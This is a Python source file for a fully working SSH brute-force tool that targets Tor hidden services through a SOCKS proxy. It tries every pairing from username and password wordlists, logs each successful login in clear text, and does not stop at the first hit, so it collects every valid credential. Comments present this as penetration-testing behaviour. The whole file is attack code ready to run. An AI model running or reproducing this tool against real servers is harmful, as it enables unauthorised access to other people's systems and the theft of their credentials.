#!/usr/bin/env python3
"""
Automated SSH Brute Force for Hidden Services
No user interaction required - designed for automated scanning
"""

import os
import sys
import time
import socket
import logging
import paramiko
from datetime import datetime

# Disable paramiko logging
logging.getLogger("paramiko").setLevel(logging.WARNING)

class SSHBruteForceAuto:
    """Automated SSH brute force attack"""
    
    def __init__(self, host, port=22, username_file="", password_file="", threads=10, timeout=30, proxies=None):
        """Initialize SSH brute force"""
        self.host = host
        self.port = port
        self.username_file = username_file
        self.password_file = password_file
        self.threads = threads
        self.timeout = timeout
        self.proxies = proxies or {}
        self.results = []
    
    def _check_port(self):
        """Check if SSH port is open"""
        try:
            logging.info(f"Checking SSH port {self.port} on {self.host}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # For Tor hidden services, we need to use SOCKS proxy
            if self.proxies and '.onion' in self.host:
                import socks
                sock = socks.socksocket()
                
                # Parse proxy URL
                proxy_url = self.proxies.get('http', '').replace('socks5h://', '')
                if ':' in proxy_url:
                    proxy_host, proxy_port = proxy_url.split(':')
                    sock.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result == 0:
                logging.info(f"SSH port {self.port} is open")
                return True
            else:
                logging.warning(f"SSH port {self.port} is not accessible")
                return False
                
        except Exception as e:
            logging.error(f"Error checking SSH port: {e}")
            return False
    
    def _load_file(self, filepath):
        """Load wordlist from file"""
        try:
            if not os.path.isfile(filepath):
                logging.error(f"File not found: {filepath}")
                return []
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            
            logging.info(f"Loaded {len(lines)} entries from {filepath}")
            return lines
        except Exception as e:
            logging.error(f"Error loading file {filepath}: {e}")
            return []
    
    def _attempt_login(self, username, password):
        """Attempt SSH login with credentials"""
        client = paramiko.SSHClient()
        # Note: AutoAddPolicy is intentional for automated scanning of unknown hosts
        # This is necessary for penetration testing tools. See SECURITY.md
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # Configure proxy for .onion addresses
            sock = None
            if self.proxies and '.onion' in self.host:
                import socks
                proxy_url = self.proxies.get('http', '').replace('socks5h://', '')
                if ':' in proxy_url:
                    proxy_host, proxy_port = proxy_url.split(':')
                    
                    sock = socks.socksocket()
                    sock.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
                    sock.settimeout(self.timeout)
                    sock.connect((self.host, self.port))
            
            # Attempt connection
            client.connect(
                hostname=self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                sock=sock,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Note: Logging passwords in clear text is intentional for credential discovery
            # This is expected behavior for penetration testing tools
            # See SECURITY.md for mitigation strategies
            logging.info(f"✓ SUCCESS: {username}:{password}")
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            # Authentication failed - wrong credentials
            return False
        except Exception as e:
            logging.debug(f"SSH connection error: {e}")
            return False
        finally:
            try:
                client.close()
            except:
                pass
    
    def run(self):
        """Run the automated brute force attack"""
        logging.info(f"Starting SSH brute force on {self.host}:{self.port}")
        
        # Check if port is accessible
        if not self._check_port():
            logging.error("SSH port is not accessible")
            return []
        
        # Load wordlists
        usernames = self._load_file(self.username_file)
        passwords = self._load_file(self.password_file)
        
        if not usernames:
            logging.error("No usernames loaded")
            return []
        
        if not passwords:
            logging.error("No passwords loaded")
            return []
        
        # Perform brute force
        total = len(usernames) * len(passwords)
        current = 0
        
        logging.info(f"Testing {len(usernames)} username(s) with {len(passwords)} password(s) ({total} combinations)")
        
        for username in usernames:
            for password in passwords:
                current += 1
                
                if current % 10 == 0:
                    progress = (current / total) * 100
                    logging.info(f"Progress: {current}/{total} ({progress:.1f}%)")
                
                if self._attempt_login(username, password):
                    result = {
                        'timestamp': datetime.now().isoformat(),
                        'host': self.host,
                        'port': self.port,
                        'username': username,
                        'password': password,
                        'service_type': 'ssh'
                    }
                    self.results.append(result)
                    
                    # Don't break - continue to find all valid credentials
                
                # Small delay to avoid connection issues
                time.sleep(0.5)
        
        logging.info(f"Completed. Found {len(self.results)} credential(s)")
        return self.results
